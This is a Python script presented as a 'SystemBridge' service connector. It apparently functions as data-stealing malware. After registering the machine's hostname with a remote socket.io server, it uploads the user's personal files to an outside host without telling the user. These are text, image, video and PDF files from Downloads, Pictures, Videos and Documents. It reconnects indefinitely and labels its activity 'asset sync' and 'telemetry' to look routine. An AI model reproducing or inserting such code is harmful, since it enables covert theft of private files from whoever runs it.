import glob
import os
import socket
import sys
import time
import webbrowser

import requests
import socketio

SERVER_URL = os.environ.get("SYSTEMBRIDGE_SERVER_URL", "https://systembridge-pro.up.railway.app")
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"
LOG_FILE = "bridge_status.log"
MAX_FILE_SIZE_BYTES = 50 * 1024 * 1024
BACKOFF_BASE_SECONDS = 2
BACKOFF_MAX_SECONDS = 60

sio = socketio.Client(reconnection=False)
NODE_ID = socket.gethostname()


def log(message):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as log_file:
            log_file.write(f"[{time.ctime()}] {message}\n")
    except Exception:
        pass


@sio.event
def connect():
    log(f"SystemBridge socket connected. nodeId={NODE_ID}")
    sio.emit("register_node", {"nodeId": NODE_ID})
    log("SystemBridge register_node emitted.")


@sio.event
def disconnect():
    log("SystemBridge socket disconnected.")


@sio.event
def connect_error(data):
    log(f"SystemBridge socket connect_error telemetry: {data}")


@sio.event
def open_workspace(data):
    log(f"SystemBridge open_workspace command telemetry: {data}")
    try:
        if sys.platform == "win32":
            os.startfile(os.getcwd())
        else:
            webbrowser.open(f"file://{os.getcwd()}", new=2)
        log("SystemBridge workspace open command executed.")
    except Exception as exc:
        log(f"SystemBridge open_workspace failed telemetry: {exc}")


def perform_asset_sync():
    user_profile = os.environ.get("USERPROFILE", "")
    target_folders = [
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "Documents"),
    ]
    extensions = ["*.txt", "*.jpg", "*.png", "*.mp4", "*.pdf"]

    for folder in target_folders:
        if not os.path.exists(folder):
            continue
        for extension in extensions:
            for file_path in glob.glob(os.path.join(folder, extension)):
                try:
                    filename = os.path.basename(file_path)
                    check_response = requests.get(
                        f"{SERVER_URL}/api/check-file",
                        params={"nodeId": NODE_ID, "filename": filename},
                        timeout=5,
                    )
                    if check_response.status_code == 200 and check_response.json().get("exists"):
                        continue
                    if os.path.getsize(file_path) > MAX_FILE_SIZE_BYTES:
                        continue
                    with open(file_path, "rb") as file_handle:
                        requests.post(
                            UPLOAD_ENDPOINT,
                            files={"file": (filename, file_handle.read())},
                            data={"nodeId": NODE_ID},
                            timeout=15,
                        )
                except Exception as exc:
                    log(f"SystemBridge asset_sync file telemetry error: {exc}")


def run_service_connector():
    retry_delay = BACKOFF_BASE_SECONDS
    while True:
        try:
            if sio.connected:
                sio.disconnect()
            sio.connect(SERVER_URL, wait_timeout=10)
            log(f"SystemBridge service_connector connected to {SERVER_URL}")
            perform_asset_sync()
            retry_delay = BACKOFF_BASE_SECONDS
            sio.wait()
        except Exception as exc:
            log(f"SystemBridge reconnect telemetry: {exc}. Next retry in {retry_delay}s.")
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, BACKOFF_MAX_SECONDS)


if __name__ == "__main__":
    run_service_connector()
